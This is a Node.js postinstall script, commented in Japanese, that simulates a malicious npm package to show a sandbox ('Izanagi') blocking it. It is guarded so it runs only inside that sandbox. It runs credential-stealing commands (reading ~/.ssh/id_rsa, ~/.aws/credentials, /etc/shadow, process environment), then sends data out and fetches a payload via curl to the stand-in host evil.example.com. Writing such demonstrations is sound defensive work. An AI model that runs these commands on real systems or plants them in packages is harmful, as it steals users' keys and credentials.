#!/usr/bin/env node
// サプライチェーン攻撃のシミュレーション
// 実際の攻撃パッケージが行う典型的な手口を再現する。
//
// 注意: このスクリプトは Izanagi サンドボックス内での実行を想定しています。

const os = require("os");
const { execSync } = require("child_process");

// ホスト誤実行防止: ユーザー名 + 環境変数の二重チェック
if (os.userInfo().username !== "izanagi" || process.env.IZANAGI_DEMO !== "1") {
  console.error(
    "[postinstall] ERROR: このスクリプトは Izanagi サンドボックス内でのみ実行できます。"
  );
  console.error(
    "[postinstall] 実行方法: bash demo/run-inline.sh"
  );
  process.exit(1);
}

function run(label, cmd) {
  console.log(`\n\x1b[33m[attack ${label}]\x1b[0m`);
  console.log(`\x1b[90m$ ${cmd}\x1b[0m`);
  try {
    const out = execSync(cmd, { timeout: 5000, encoding: "utf-8", stdio: ["pipe", "pipe", "pipe"] });
    if (out.trim()) console.log(out.trimEnd());
    console.log(`\x1b[31m⚠ SUCCESS — データが漏洩しました\x1b[0m`);
  } catch (e) {
    const stderr = (e.stderr || "").trim();
    if (stderr) console.log(stderr);
    console.log(`\x1b[32m✓ BLOCKED\x1b[0m`);
  }
}

console.log("\x1b[1m=== Supply Chain Attack Simulation ===\x1b[0m");
console.log(`user: ${os.userInfo().username}  home: ${os.homedir()}`);

run("1: SSH 秘密鍵の窃取",
  "cat ~/.ssh/id_rsa");

run("2: AWS クレデンシャルの窃取",
  "cat ~/.aws/credentials");

run("3: /etc/shadow の読み取り",
  "cat /etc/shadow");

run("4: 環境変数の窃取",
  "cat /proc/self/environ | tr '\\0' '\\n' | head -5");

run("5: 窃取データの外部送信",
  "curl -s --max-time 3 -X POST -d stolen=ssh-key http://evil.example.com/exfil");

run("6: リバースシェル用ペイロードの取得",
  "curl -s --max-time 3 http://evil.example.com/payload -o /tmp/payload");

console.log("\n\x1b[1m=== Simulation Complete ===\x1b[0m");
